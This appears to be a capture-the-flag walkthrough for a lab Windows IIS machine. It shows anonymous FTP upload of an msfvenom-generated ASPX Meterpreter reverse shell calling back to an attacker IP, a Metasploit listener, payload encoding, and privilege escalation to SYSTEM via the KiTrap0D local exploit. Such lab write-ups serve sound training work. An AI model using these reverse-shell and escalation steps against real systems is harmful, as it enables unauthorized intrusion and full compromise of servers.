
## 1. Setup & Discovery

- **Anonymous FTP login allowed**
    
- **FTP root exposed via web service** (Port 80)
    
- **Microsoft IIS** running on web service
    
- IIS supports `.aspx` execution → uploadable reverse shell possible
    

---

## 2. Scan the Target

```
nmap -sV -T4 -p- 10.10.10.5
```

**Open Ports:**

```
21/tcp open  ftp     Microsoft ftpd
80/tcp open  http    Microsoft IIS httpd 7.5
```

---

## 3. FTP Access

```
ftp 10.10.10.5
Name: anonymous
Password: [any]
230 User logged in.
```

**Directory Listing Example:**

```
03-17-17  welcome.png
aspnet_client/
iisstart.htm
```

_Confirmed:_ Can upload `.aspx` payloads.

---

## 4. Generate Payload

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
```

**Output:**

```
Payload size: 341 bytes
Final file size: 2819 bytes
Format: ASPX
Architecture: x86
```

---

## 5. Deploy Payload

Upload `reverse_shell.aspx` via FTP, then browse to:

```
http://10.10.10.5/reverse_shell.aspx
```

_Note:_ The page looks blank, but the payload executes silently.

---

## 6. Setup Listener

```
msfconsole -q
msf6 > use multi/handler
msf6 > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 > set LHOST 10.10.14.5
msf6 > set LPORT 1337
msf6 > run
```

---

## 7. Gain Access

```
[*] Sending stage (176195 bytes) to 10.10.10.5
[*] Meterpreter session 1 opened
meterpreter > getuid
Server username: IIS APPPOOL\Web
```

_Success: Meterpreter reverse shell established._

---

## 8. If Session Dies Quickly

Encode payload for stability:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -e x86/shikata_ga_nai -f aspx > reverse_shell_encoded.aspx
```

---

## 9. Privilege Escalation

### Use Local Exploit Suggester

```
msf6 > search local exploit suggester
msf6 > use post/multi/recon/local_exploit_suggester
msf6 post(...) > set SESSION 2
msf6 post(...) > run
```

**Common Recommendations:**

- `bypassuac_eventvwr`
    
- `ms10_015_kitrap0d`
    
- `ms13_081_track_popup_menu`
    

---

### Exploit Example: KiTrap0D

```
msf6 > use exploit/windows/local/ms10_015_kitrap0d
msf6 > set SESSION 3
msf6 > set LHOST 10.10.14.5
msf6 > set LPORT 1338
msf6 > run
```

**Result:**

```
[*] Meterpreter session 4 opened
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

_Privilege escalated to SYSTEM level._

---

## 10. Useful Resources

- **MSFVenom Payload Cheat Sheet**
    
- **Metasploit Unleashed** – Offensive Security
    
- **Metasploit: The Penetration Tester’s Guide** – No Starch Press